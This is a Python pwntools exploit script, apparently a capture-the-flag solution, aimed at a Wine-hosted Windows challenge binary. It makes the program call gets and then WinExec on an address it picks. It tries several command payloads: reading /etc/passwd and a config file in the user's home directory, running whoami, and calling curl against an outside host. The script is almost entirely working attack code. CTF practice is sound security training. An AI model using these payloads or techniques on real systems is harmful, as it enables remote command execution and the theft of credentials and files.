#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

if args.LOCAL:
    p = process(["wine", "../handout/challenge.exe"])
else:
    p = remote(HOST, int(PORT))

target = 0x000000000031fad0
target = 0x1122334455667788
target = 0x140014090

p.sendlineafter("Which module", b"msvcrt.dll")
p.sendlineafter("function", b"gets")
p.sendlineafter("argument", str(target))

payload = "start /unix /home/livectf/submitter"
payload = "whoami"
payload = "start /unix /usr/bin/cat /home/livectf/.config.toml"
payload = "start /unix /usr/bin/curl ctf.bricked.tech:1337"
payload = "type Z:\\home\\livectf\\.config.toml"
payload = "type Z:\\etc\\passwd"
payload = "cmd.exe /c 'start /unix /usr/bin/curl ctf.bricked.tech:1337'"
payload = "cmd.exe /c type Z:\\home\\livectf\\.config.toml"
p.sendline(payload)

#p.sendlineafter("Which module", b"msvcrt.dll")
p.sendlineafter("Which module", b"kernel32.dll")
p.sendlineafter("function", b"WinExec")
p.sendlineafter("argument", str(target))

print(p.recvuntil(b"}"))
p.close()
